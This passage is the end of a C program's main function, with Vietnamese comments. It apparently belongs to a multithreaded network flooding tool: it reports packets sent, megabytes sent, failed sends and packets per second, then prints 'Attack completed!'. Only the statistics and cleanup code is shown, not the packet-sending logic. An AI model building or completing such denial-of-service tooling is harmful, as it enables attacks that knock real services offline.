        sleep(1);
        pthread_mutex_lock(&stats.mutex);
        double elapsed = get_current_time() - stats.start_time;
        printf("\rTime: %.1fs, Packets: %lu, Data: %.2f MB, Failed: %lu, PPS: %.2f",
               elapsed,
               stats.packets_sent,
               stats.bytes_sent / 1048576.0,
               stats.failed_sends,
               stats.packets_sent / elapsed);
        fflush(stdout);
        pthread_mutex_unlock(&stats.mutex);
    }

    // Chờ các thread kết thúc
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    // Hiển thị thống kê cuối cùng
    double total_time = get_current_time() - stats.start_time;
    printf("\n\nAttack completed!\n");
    printf("Total packets sent: %lu\n", stats.packets_sent);
    printf("Total data sent: %.2f MB\n", stats.bytes_sent / 1048576.0);
    printf("Average PPS: %.2f\n", stats.packets_sent / total_time);
    printf("Failed sends: %lu\n", stats.failed_sends);

    free(thread_pool);
    pthread_mutex_destroy(&stats.mutex);
    return EXIT_SUCCESS;
}